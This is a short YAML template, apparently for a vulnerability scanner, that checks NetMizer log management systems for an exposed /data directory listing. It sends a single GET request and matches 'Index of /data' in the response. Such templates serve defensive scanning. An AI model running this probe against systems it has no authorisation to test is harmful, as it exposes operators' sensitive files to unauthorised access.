expression: r0()
id: netmizer-log-management-data-directory-traversal
info:
  author: zan8in
  description: "\u5317\u4EAC\u7075\u5DDE\u7F51\u7EDC\u6280\u672F\u6709\u9650\u516C\
    \u53F8NetMizer\u65E5\u5FD7\u7BA1\u7406\u7CFB\u7EDF\u5B58\u5728\u76EE\u5F55\u904D\
    \u5386\u6F0F\u6D1E\uFF0C\u7531\u4E8E /data \u63A7\u5236\u4E0D\u4E25\u683C\uFF0C\
    \u653B\u51FB\u8005\u53EF\u5229\u7528\u8BE5\u6F0F\u6D1E\u83B7\u53D6\u654F\u611F\
    \u4FE1\u606F\u3002\ntitle=\"NetMizer \u65E5\u5FD7\u7BA1\u7406\u7CFB\u7EDF\"\n"
  name: "NetMizer \u65E5\u5FD7\u7BA1\u7406\u7CFB\u7EDF data \u76EE\u5F55\u904D\u5386\
    \u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/NetMizer/NetMizer%20%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20data%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
  severity: medium
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'Index of /data')
      && response.body.bcontains(b'Parent Directory')
    request:
      method: GET
      path: /data
